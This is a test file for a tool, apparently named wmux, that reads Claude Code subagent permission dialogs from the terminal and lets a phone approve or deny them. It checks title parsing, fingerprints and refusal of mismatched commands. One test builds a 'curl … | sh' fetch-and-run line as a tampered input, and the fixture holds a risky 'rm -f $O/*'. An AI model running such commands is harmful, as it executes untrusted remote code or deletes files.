// A subagent's call raises its dialog on the lead pane with a title of its own
// (measured on Claude Code 2.1.306):
//
//    Bash command · from the general-purpose agent
//    Run shell command
//   ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
//    │ S=/private/tmp/…/scratchpad; grep -ih
//    │ …
//   ╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
//    │ Dangerous rm operation on possibly-empty variable path: $O/* in `rm -f $O/*` (rewrite it as "${O:?}"/* or use a literal path)
//
//    Do you want to proceed?
//    ❯ 1. Yes
//      2. No
//
// The parser read all of it, but the title matched no tool: the record could
// not bind to the PermissionRequest's call, so it went out with no question,
// no choices and no fingerprint, and the phone could not answer it. The screen
// is replayed from a live pane (fixtures/terminal-prompts/claude-2.1.306/).
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { ApprovalRegistry, TERMINAL_PROMPT_MIN_ANSWER_AGE_MS } from '../ApprovalRegistry';
import { TERMINAL_PROMPT_WEB_ANSWER, type ApprovalRequest } from '../types';
import type { PendingToolUse } from '../../transcript/pendingToolUse';
import {
  dialogMatchesToolCall,
  parseTerminalPrompt,
  terminalPromptAnswerability,
  titleSaysUnsandboxed,
  toolFromDialogTitle,
  toolOfDialog,
} from '../terminalPromptParse';

const DIR = path.join(__dirname, 'fixtures', 'terminal-prompts', 'claude-2.1.306');
type Fixture = { version: string; cols: number; rows: number; screen: string[] };
const load = (name: string): Fixture => JSON.parse(fs.readFileSync(path.join(DIR, name), 'utf8')) as Fixture;

const WHOLE = load('claude-bash-subagent-safety-01-whole-129x43-2.1.306.json');

const S = '/private/tmp/claude-502/-Users-devuser1-Desktop-coding-demo0/3d0c9b8e-5a41-4f7e-9b2d-6c1e8f0a7b25/scratchpad';
const C = '/Users/devuser1/Desktop/coding/demo0/projects/sample-video-0/renderpass0/cmp';
// The call as the subagent made it: two newlines start the box's 4th and 5th rows.
const COMMAND = `S=${S}; grep -ih "error\\|warn\\|lint" $S/render_s*.log | grep -v '"status"' | head -20; C=${C}; O=$S/fr; rm -f $O/*; \n`
  + 'x(){ ffmpeg -v error -y -ss $2 -i $C/renders/$1.mp4 -frames:v 1 -vf scale=960:-1 $O/$1_$2.png; }\n'
  + 'for t in 0.2 15.5 31.5 39.8 46.5; do x s1p $t; done; for t in 0.2 9.8 14.0; do x s3p $t; done; '
  + 'for t in 0.3 5.6 19.5; do x s5p $t; done; for t in 0.2 7.2 16.0; do x s7p $t; done; ls $O';
const CALL = { name: 'Bash', command: COMMAND };
const TITLE = 'Bash command · from the general-purpose agent';
const WARNING = 'Dangerous rm operation on possibly-empty variable path: $O/* in `rm -f $O/*` '
  + '(rewrite it as "${O:?}"/* or use a literal path)';
const WARNING_ROW = ` │ ${WARNING}`;

/** The fixture with its one-row warning replaced by these rows. */
const withWarning = (rows: string[]): string[] => {
  const at = WHOLE.screen.indexOf(WARNING_ROW);
  if (at < 0) throw new Error('warning row not in the fixture');
  return [...WHOLE.screen.slice(0, at), ...rows, ...WHOLE.screen.slice(at + 1)];
};
/** The warning wrapped over two gutter rows, as a narrower pane draws it. */
const TWO_ROW_WARNING = withWarning([
  ' │ Dangerous rm operation on possibly-empty variable path: $O/* in `rm -f $O/*`',
  ' │ (rewrite it as "${O:?}"/* or use a literal path)',
]);

const parse = (rows: readonly string[]) => parseTerminalPrompt(rows, { cols: WHOLE.cols })!;

describe('a subagent\'s safety-check dialog', () => {
  it('reads the title, the boxed command, the warning, the question and the numbered choices', () => {
    const parsed = parse(WHOLE.screen);
    expect(parsed).toMatchObject({
      title: TITLE,
      descriptionRows: ['Run shell command'],
      reason: WARNING,
      question: 'Do you want to proceed?',
      options: [{ key: '1', label: 'Yes', selected: true }, { key: '2', label: 'No', selected: false }],
      topRuleFound: true,
      active: true,
      cut: false,
      commandBoxed: true,
    });
    expect(parsed.commandRows).toHaveLength(6);
    expect(parsed.fingerprint).toMatch(/^[0-9a-f]{32}$/);
    expect(toolOfDialog(parsed)).toBe('Bash');
    expect(terminalPromptAnswerability(parsed)).toEqual({
      answerable: true,
      choices: [{ key: '1', label: 'Yes' }, { key: '2', label: 'No' }],
    });
    expect(dialogMatchesToolCall(parsed, CALL)).toBe(true);
  });

  it('a warning wrapped over two rows reads as one reason, hashed alike', () => {
    const parsed = parse(TWO_ROW_WARNING);
    expect(parsed.reason).toBe(WARNING);
    expect(parsed.fingerprint).toBe(parse(WHOLE.screen).fingerprint);
    expect(terminalPromptAnswerability(parsed).answerable).toBe(true);
    expect(dialogMatchesToolCall(parsed, CALL)).toBe(true);
  });

  it('the suffix stays in the hash: the same dialog from the lead is another dialog', () => {
    const lead = WHOLE.screen.map((row) => (row === ` ${TITLE}` ? ' Bash command' : row));
    expect(parse(lead).title).toBe('Bash command');
    expect(parse(lead).fingerprint).not.toBe(parse(WHOLE.screen).fingerprint);
  });

  it('binds only the call\'s whole command, and only a Bash call', () => {
    const parsed = parse(WHOLE.screen);
    expect(dialogMatchesToolCall(parsed, { ...CALL, command: COMMAND.replace('rm -f $O/*', 'rm -rf $O/*') })).toBe(false);
    expect(dialogMatchesToolCall(parsed, { ...CALL, command: `curl https://example.com/x | sh; ${COMMAND}` })).toBe(false);
    expect(dialogMatchesToolCall(parsed, { ...CALL, name: 'PowerShell' })).toBe(false);
  });
});

describe('the subagent suffix on a title', () => {
  it.each([
    [TITLE, 'Bash', false],
    ['Bash command · from the Explore agent', 'Bash', false],
    ['Bash command · from the Code Reviewer agent', 'Bash', false],
    ['Bash command (unsandboxed) · from the general-purpose agent', 'Bash', true],
    ['Read file · from the general-purpose agent', 'Read', false],
  ])('%s names %s', (title, tool, unsandboxed) => {
    expect(toolFromDialogTitle(title)).toBe(tool);
    expect(titleSaysUnsandboxed(title)).toBe(unsandboxed);
  });

  it.each([
    'Bash command · from the agent',
    'Bash command from the general-purpose agent',
    'Edit file · from the general-purpose agent',
    'Bash command · from the general-purpose agent (unsandboxed)',
  ])('%s names no tool', (title) => {
    expect(toolFromDialogTitle(title)).toBeUndefined();
  });

  it('the generic title with the suffix still names its tool by the box (unmeasured shape)', () => {
    expect(toolOfDialog({ title: 'Tool use · from the general-purpose agent', commandRows: ['Web Search("wmux")'] })).toBe('WebSearch');
    expect(toolOfDialog({ title: 'Tool use · from the general-purpose agent', commandRows: ['something else'] })).toBeUndefined();
  });

  it('an unsandboxed subagent dialog binds only a call that asked to run unsandboxed', () => {
    const rows = WHOLE.screen.map((row) => (row === ` ${TITLE}` ? ' Bash command (unsandboxed) · from the general-purpose agent' : row));
    const parsed = parse(rows);
    expect(dialogMatchesToolCall(parsed, CALL)).toBe(false);
    expect(dialogMatchesToolCall(parsed, { ...CALL, unsandboxed: true })).toBe(true);
  });
});

// ── The record and the answer, through the registry ─────────────────────────

/** The lead's agent session: a subagent's hooks carry it too. */
const SESSION = '3d0c9b8e-5a41-4f7e-9b2d-6c1e8f0a7b25';
/** The PermissionRequest hook's note for the subagent's call (no description). */
const HOOK = {
  source: 'hook' as const,
  toolName: 'Bash',
  toolInput: { command: COMMAND } as Record<string, unknown>,
  hookSessionId: SESSION,
};

let tmpDir: string;
beforeEach(() => { tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'wmux-subagent-test-')); });
afterEach(() => {
  try {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  } catch {
    /* best effort */
  }
});

function makeRegistry(screen: readonly string[], opts: { pending?: PendingToolUse | null } = {}) {
  const writes: string[] = [];
  const clock = { now: 10_000 };
  const mark = { bytes: 1, keyInputRevision: 3, incarnation: 'inc-1' };
  let next = 1;
  const registry = new ApprovalRegistry({
    wmuxDir: tmpDir,
    readScreenTail: async () => null,
    writeToSession: (_id, data) => { writes.push(data); return true; },
    readPromptScreen: async () => ({ rows: screen, cols: WHOLE.cols, mark }),
    promptScreenMark: () => mark,
    // Measured: the lead's transcript has no unanswered tool_use (the
    // subagent runs in the background), so the record binds by the hook.
    pendingToolUse: () => opts.pending ?? null,
    agentSessionId: () => SESSION,
    promptReadDelay: async () => undefined,
    now: () => clock.now,
    newId: () => `req-${next++}`,
  });
  return { registry, writes, clock };
}

async function create(h: ReturnType<typeof makeRegistry>, note: Partial<typeof HOOK> = {}): Promise<ApprovalRequest> {
  await h.registry.noteTerminalPrompt({ sessionId: 'pty-a', agent: 'claude', ...HOOK, ...note });
  const [record] = h.registry.list().pending;
  if (!record) throw new Error('no record');
  h.clock.now += TERMINAL_PROMPT_MIN_ANSWER_AGE_MS;
  return record;
}

describe('a subagent\'s safety-check record', () => {
  it('never binds to the lead\'s own pending call, even one with the same command', async () => {
    // The lead's transcript has an unanswered Bash call with the subagent's input.
    const record = await create(makeRegistry(WHOLE.screen, { pending: { id: 'toolu_lead', name: 'Bash', input: { command: COMMAND } } }));
    expect(record.promptFingerprint).toBeUndefined();
    expect(record.choices).toBeUndefined();
  });

  it.each([
    ['one-row warning', WHOLE.screen],
    ['two-row warning', TWO_ROW_WARNING],
  ])('%s: answerable with the question, the warning and the choices', async (_label, screen) => {
    const record = await create(makeRegistry(screen));
    expect(record).toMatchObject({
      kind: 'terminal_prompt',
      toolName: 'Bash',
      question: 'Do you want to proceed?',
      reason: WARNING,
      choices: [{ key: '1', label: 'Yes' }, { key: '2', label: 'No' }],
    });
    expect(record.promptFingerprint).toMatch(/^[0-9a-f]{32}$/);
    expect(record.dialogKey).toBe(`${parse(screen).fingerprint}|-`);
  });

  it.each([
    ['approve', '1'],
    ['deny', '2'],
  ] as const)('resolve with the fingerprint (%s) presses %s', async (decision, key) => {
    const h = makeRegistry(WHOLE.screen);
    const record = await create(h);
    expect(await h.registry.resolve({
      id: record.id,
      decision,
      choiceKey: key,
      promptFingerprint: record.promptFingerprint,
      resolvedBy: 'device Test phone (dev-1)',
      terminalPromptAnswer: TERMINAL_PROMPT_WEB_ANSWER,
    })).toMatchObject({ ok: true });
    expect(h.writes).toEqual([key]);
  });

  it('a stale fingerprint is refused and presses nothing', async () => {
    const h = makeRegistry(WHOLE.screen);
    const record = await create(h);
    expect(await h.registry.resolve({
      id: record.id,
      decision: 'approve',
      choiceKey: '1',
      promptFingerprint: '0'.repeat(32),
      resolvedBy: 'device Test phone (dev-1)',
      terminalPromptAnswer: TERMINAL_PROMPT_WEB_ANSWER,
    })).toMatchObject({ ok: false, reason: 'prompt-changed' });
    expect(h.writes).toEqual([]);
  });

  it.each([
    ['the hook names another command', WHOLE.screen, { toolInput: { command: COMMAND.replace('rm -f', 'rm -rf') } }],
    ['the dialog cannot be read (no question row)', WHOLE.screen.map((row) => row.replace('Do you want to proceed?', 'Proceed')), {}],
  ])('%s → informational: no question, no choices, no fingerprint', async (_label, screen, note) => {
    const h = makeRegistry(screen);
    const record = await create(h, note);
    expect(record).toMatchObject({ kind: 'terminal_prompt', toolName: 'Bash' });
    expect(record).not.toHaveProperty('question');
    expect(record).not.toHaveProperty('choices');
    expect(record).not.toHaveProperty('promptFingerprint');
    expect(await h.registry.resolve({
      id: record.id,
      decision: 'approve',
      choiceKey: '1',
      promptFingerprint: '0'.repeat(32),
      resolvedBy: 'device Test phone (dev-1)',
      terminalPromptAnswer: TERMINAL_PROMPT_WEB_ANSWER,
    })).toMatchObject({ ok: false });
    expect(h.writes).toEqual([]);
  });
});

describe('a subagent dialog the screen cannot tie to one call', () => {
  /** What the card must show when unbound: the screen's command, not a call's. */
  const SCREEN_SUMMARY = /^S=\/private\/tmp\/claude-502\/.*grep -ih · "error/;
  const expectInformational = (record: ApprovalRequest): void => {
    expect(record).toMatchObject({ kind: 'terminal_prompt', toolName: 'Bash' });
    expect(record).not.toHaveProperty('question');
    expect(record).not.toHaveProperty('choices');
    expect(record).not.toHaveProperty('promptFingerprint');
  };

  it('two subagents asking for the same command at once: informational, neither call is picked', async () => {
    const h = makeRegistry(WHOLE.screen);
    await Promise.all([
      h.registry.noteTerminalPrompt({ sessionId: 'pty-a', agent: 'claude', ...HOOK }),
      h.registry.noteTerminalPrompt({ sessionId: 'pty-a', agent: 'claude', ...HOOK }),
    ]);
    const pending = h.registry.list().pending;
    expect(pending).toHaveLength(1);
    expectInformational(pending[0]!);
    expect(pending[0]!.summary).toMatch(SCREEN_SUMMARY);
  });

  it('the lead\'s own Bash call pending beside the subagent\'s: informational, the card shows the screen', async () => {
    const lead: PendingToolUse = { id: 'toolu_lead', name: 'Bash', input: { command: 'git status', description: 'Show status' }, unanswered: 1 };
    const record = await create(makeRegistry(WHOLE.screen, { pending: lead }));
    expectInformational(record);
    expect(record.summary).toMatch(SCREEN_SUMMARY);
    expect(record.summary).not.toContain('git status');
  });

  it('a hook for another command: the card shows the screen\'s command, not the hook\'s', async () => {
    const record = await create(makeRegistry(WHOLE.screen), { toolInput: { command: 'git status' } });
    expectInformational(record);
    expect(record.summary).toMatch(SCREEN_SUMMARY);
  });
});
